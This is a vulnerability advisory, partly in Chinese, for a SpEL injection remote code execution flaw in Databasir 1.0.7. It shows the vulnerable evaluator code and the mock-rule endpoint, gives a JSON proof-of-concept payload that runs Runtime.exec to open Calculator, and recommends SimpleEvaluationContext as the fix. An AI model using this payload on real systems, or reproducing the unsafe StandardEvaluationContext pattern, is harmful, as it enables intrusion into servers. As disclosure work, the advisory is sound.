### 影响

Databasir is a team-oriented relational database model document management platform.
Databasir 1.0.7 has remote code execution vulnerability.
Remote code execution vulnerability is a Web security vulnerability, we can execute any command, such as `open -a Calculator`

### 不安全的代码

`SpelScriptEvaluator`使用了StandardEvaluationContext作为context，`script`参数可控并且没有任何过滤

> SimpleEvaluationContext - 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 Spal 语言特性和配置选项的子集。
>
> StandardEvaluationContext - 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

```java
@Component
@RequiredArgsConstructor
public class SpelScriptEvaluator implements MockScriptEvaluator {

    private final SpelExpressionParser spelExpressionParser = new SpelExpressionParser();

    @Override
    public String evaluate(String script, ScriptContext context) {
        Expression expression = spelExpressionParser.parseExpression(script);
        StandardEvaluationContext spelContext = new StandardEvaluationContext(context);
        return expression.getValue(spelContext, String.class);
    }
}
```

### 漏洞入口

在进行rules校验时

```java
    @PreAuthorize("hasAnyAuthority('SYS_OWNER', 'GROUP_OWNER?groupId='+#groupId, 'GROUP_MEMBER?groupId='+#groupId)")
    @Operation(summary = "保存 Mock Rule")
    @AuditLog(module = AuditLog.Modules.PROJECT, name = "保存 Mock Rule",
            involvedProjectId = "#projectId",
            involvedGroupId = "#groupId")
    @PostMapping(Routes.MockData.SAVE_MOCK_RULE)
    public JsonData<Void> saveMockRules(@PathVariable Integer groupId,
                                        @PathVariable Integer projectId,
                                        @PathVariable Integer tableId,
                                        @RequestBody @Valid List<ColumnMockRuleSaveRequest> rules) {
        mockDataService.saveMockRules(projectId, tableId, rules);
        return JsonData.ok();
    }
```

### POC

攻击者可以控制rules的参数来造成rce，例如：

```json
[
  {
    "columnName": "test",
    "dependentColumnName": "test",
    "dependentTableName": "test",
    "mockDataScript": "T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('open -a Calculator')",
    "mockDataType": "SCRIPT",
    "tableName": "test"
  }
]
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2bc2a508c7934b44803437cb64670678.png)



### 修复建议

最直接的方式：使用`SimpleEvaluationContext`来替换`StandardEvaluationContext`

